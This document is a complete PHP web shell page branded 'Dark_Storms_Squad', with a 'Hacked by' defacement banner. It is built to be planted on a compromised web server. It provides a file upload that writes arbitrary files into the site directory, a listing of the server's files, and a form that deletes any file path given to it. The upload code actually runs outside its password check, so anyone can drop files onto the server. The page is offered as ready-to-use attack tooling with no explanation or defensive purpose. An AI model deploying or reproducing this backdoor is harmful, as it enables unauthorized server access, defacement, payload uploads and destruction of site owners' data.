<!DOCTYPE html>
<html lang='en-us' dir='ltr'>
<head>

<title>shell_DaRK_StOrMS_SQuad</title >
<meta http-equiv='Content-Type' content='text/html ; charset=utf-8'>

<meta charset='utf-8'>
<meta name="viewport" content="width=device-width, initial-scale=0.5 ,user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name='keywords' content=''>
<meta name='description' content=''>
<meta name='google' value='notranslate'>
<link rel="icon" href="https://anonymousaccounts.000webhostapp.com/ICON_SHELL_DSS.jpg" type="image/jpg" />
<meta name='author' content='ESschools'>


</head>
<style>
@media only screen and (min-width:600px){     /*---------big-------*/
*{
   
    margin:0px;
    color:#1b7ec4;
    font-size:19px;
    outline:none;
    margin-top:5px;
    
   

}
body{
background:black;
}
h2{
    color:green;
}
h1{
color:red;
}
#upload{
display:block;

}
input[type='submit']{
    color:red;
    padding:5px;
    background-color:#FFF;
    

}
input[type='password']{
padding:5px;
border:1px solid red;
}
table{
 
    padding:2px;
    border-collapse:collapse;
    border:2px solid #1b7ec4;
    width:90%;
}
tr{
     padding:2px;
    border:2px solid #1b7ec4;
  
}
th{
     padding:2px;
    border:2px solid #1b7ec4;
    width:5%;
}
td{
  
    padding:5px;
    border:2px solid #1b7ec4;
    width:5%;
    
}
    #ccopy{
    background-color:#3a3434;
    width:100%;
    height:30px;
}
    #copy{
    line-height:30px;
    color:#ca1313;
    font-size:18px;
    }
    input[type='text']{
        
        padding:5px;
        border:1px solid red;
    }
    
}
@media only screen and (max-width:600px){     /*---------small-------*/
*{
   
    margin:0px;
    color:#1b7ec4;
    font-size:19px;
    outline:none;
    margin-top:5px;
    
   

}
body{
background:black;
}
h2{
    color:green;
}
h1{
color:red;
}
#upload{
display:block;

}
input[type='submit']{
    color:red;
    padding:5px;
    background-color:#FFF;
    

}
input[type='password']{
padding:5px;
border:1px solid red;
}
table{
 
    padding:2px;
    border-collapse:collapse;
    border:2px solid #1b7ec4;
    width:90%;
}
tr{
     padding:2px;
    border:2px solid #1b7ec4;
  
}
th{
     padding:2px;
    border:2px solid #1b7ec4;
    width:5%;
}
td{
  
    padding:5px;
    border:2px solid #1b7ec4;
    width:5%;
    
}
    #ccopy{
    background-color:#3a3434;
    width:100%;
    height:30px;
}
    #copy{
    line-height:30px;
    color:#ca1313;
    font-size:18px;
    }
    input[type='text']{
        
        padding:5px;
        border:1px solid red;
    }
    
}
</style>
<header>
 <center>
   
    <p id='copy'>2018 - <?php echo date('Y'); ?> &copy;  ESschools &trade; </p>
    </center>
    </header>

<body>
<center>
<div>
<h1>Hacked by </h1>
<marquee behavior="scroll" width="40%" height="60px" direction="left" scrollamount="4">
<h2>Dark_Storms_Squad &lt; welcome to our world &gt; </h2>
</marquee>
</div>
<!------------------------
<form action="dss.php?action=cookie" method='POST' enctype='multipart/form-data'>
      <input type='text'  placeholder='Enter Your name cookie' name="input_cookie" required>
     <input type='submit' value='Cookie' name='Enter_cookie'  >
    
    </form>
<!------------------------------------>

<br>

<?php

$cookie_value = $_POST['input_cookie'];
setcookie('cookie_name', $cookie_value, time() + (86400 * 30), "/");


if(!isset($_COOKIE['cookie_name'])){
    
 echo "Cookie " . $_COOKIE['cookie_name'] . " is not set<br>"; 

}else{
    
     echo "Cookie is set<br>";
     echo "Value is: " . $_COOKIE['cookie_name'];

}

?>



<?php  print("Your IP : {$_SERVER['REMOTE_ADDR']} ");  ?>
<br>
<?php  print(" : {$_SERVER['HTTP_USER_AGENT']} ");  ?>
<br>
<?php
if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== FALSE) {
    echo 'You are using Internet Explorer.<br />';
}else{
    echo 'You are using  browser  .<br />';
}
?>

<br>

<!--------------main-menu----------->
<form id='form'  action='?' method='GET' enctype='multipart/form-data' >
<p>Enter the password to Upload_file</p>
<input type='password' name='pass' id='pass' required>
<input type="submit" name="Epass"  value='Enter' >
<div id='Dmo'> </div>
</form>








<br>

<?php $encode=md5("Develober:ESschools");

print("<script>console.log('$encode')</script>"); 

?> 

<br>

<?php 
//PUT YOUR PASS [del] -> down

if(isset($_GET['Epass'])){
   $pass= '----HERE----';
if($_GET['pass'] == $pass){
print("
<form id='upload'  action='?' method='POST' enctype='multipart/form-data' >
<p>Uploading_File</p>
<input type='file' name='upload' id='name'  style='width:200px' >
<input type='submit' name='submit' value='Upload'>
<div id='demo'> </div>
</form>

");



}else{
    print('
    <script>
    document.getElementById("Dmo").innerHTML = "<p style=color:red >" + " Error " + "</p>"
    </script>
   
    ');


}
}


$dir_name=dirname(__FILE__)."/";
$path=$_FILES['upload']['tmp_name'];
$name=$_FILES['upload']['name'];
$type=$_FILES['upload']['type'];
$size=$_FILES['upload']['size'];
$error=$_FILES['upload']['error'];

$up=move_uploaded_file($path,$dir_name.$name);
if(!$up){

    print('
    <script>
    document.getElementById("demo").innerHTML = "<p style=color:red >" + " The file was not uploaded  " + "</p>"
    </script>
  
    ');
    
     
}else{
    print('
    <script>
    document.getElementById("demo").innerHTML = "<p style=color:green >" + " The file was uploaded  " + "</p>"
    </script>
    
    ');
}


?>

<br>

<hr style="width:auto;background-color:#1b7ec4;height:2px;padding:0px;">

<br>
<br>

<?php

$dir='./';

if(is_dir($dir)){
    
    if($od=opendir($dir)){
        
      
       
        print("
        
          <table >
             <thead>
             <tr>
             
             <th>Name</th>
              <th>Size</th>
              <th>date</th>

             </tr>
             </head>
        
        ");
        
        while($file=readdir($od)){
          
           $file_size = filesize("$file");
       
           $file_last_access = date("m d Y   h:i:s",fileatime("$file"));
            
           
          
          print("
          
                <tbody>
                 <tr>
                    <td><a href='$file'>$file</a></td>
                     <td>$file_size&nbsp;KB</td>
                       <td>$file_last_access</td>
                 
                 
                   
                 </tr>
                 
              </tbody>
           
    
          
          ");  
        }
        
        print("</table>");
    
     closedir($od);
    }
    
}



?>

<br>

<form id='form'  action='?' method='POST' enctype='multipart/form-data' >
<p>Enter the password to Edit Files</p>
<input type='password' name='passE' id='pass' required>
<input type="submit" name="EpassE"  value='Enter' >
<div id='Dmo'> </div>
</form>

<?php

//PUT YOUR PASS [del] -> down

if(isset($_POST['EpassE'])){
if($_POST['passE'] == '----HERE----'){
print("
<form id='upload'  action='?' method='POST' enctype='multipart/form-data' >
    <h3 style='color:red;'>Put a file name to delete.</h3>
    <input type='text' placeholder='delete_file' name='delete' required>
     <input type='submit' name='del_file' onclick='return mess()' value='delete'>
    </form>
    ");
}else{
    
}
   print('
    <script>
    document.getElementById("Dmo").innerHTML = "<p style=color:red >" + " Error " + "</p>"
    </script>
   
    ');  
}

?>
    
    
    <?php
    


   if(isset($_POST['del_file'])){
       
$path_del = $_POST['delete'];
if(rmdir){
       echo "-Del-done-1 ";
}
else{
  echo "-Del-No-0  <br> " ;
}

if(unlink($path_del)) { 
   echo "-Del-done -1";
}else{
  echo "-Del-No-0 X " ;
}
   }
    
    exit();
    ?>


<script>
 
 function mess(){
     
   window.location.reload();
    
    
 }


</script>

</center>

<?php

  exit();
?>

</body>
</html>